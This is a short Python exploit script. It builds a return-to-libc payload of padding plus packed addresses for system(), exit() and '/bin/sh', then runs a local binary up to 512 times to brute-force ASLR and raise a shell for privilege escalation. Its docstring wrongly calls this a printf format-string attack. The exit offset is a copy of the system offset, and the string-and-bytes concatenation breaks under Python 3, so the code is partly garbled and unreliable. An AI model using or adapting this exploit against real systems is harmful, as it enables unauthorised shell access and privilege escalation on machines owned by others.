"""
A simple script for generating manipulative strings which can abuse badly-
implemented printf calls in C/C#/C++ programs. It is designed to result
in the program raising a shell. If used correctly this can result in
privilege escalation. In order to use, the memory address and offset
of several components must be obtained using ldd, strings, and readelf.
Additionally, the script will also call the target binary up to 512 times,
to defeat milder implementations of ASLR.
"""

from subprocess import call
import struct

addr_libc = 0xb7e19000  # Needed to start the process.
offset_system = 0x0003ada0  # Obtain from the libc binary being called.
offset_exit = 0x0003ada0
offset_binsh = 0x0015ba0b
fault_pos = 52  # obtain with gdd and patterning.
tgt_path = "/home/ayush/.binary/rop"  # Use an absolute value when possible.

addr_system = struct.pack("<I", addr_libc+offset_system)
addr_exit = struct.pack("<I", addr_libc+offset_exit)
addr_binsh = struct.pack("<I", addr_libc+offset_binsh)

buf = "A"*fault_pos
buf += addr_system
buf += addr_exit
buf += addr_binsh

print(buf)

for i in range (0,512):  # Defeats most reasonable ASLR methods.
    print(i)
    ret = call([tgt_path, buf])


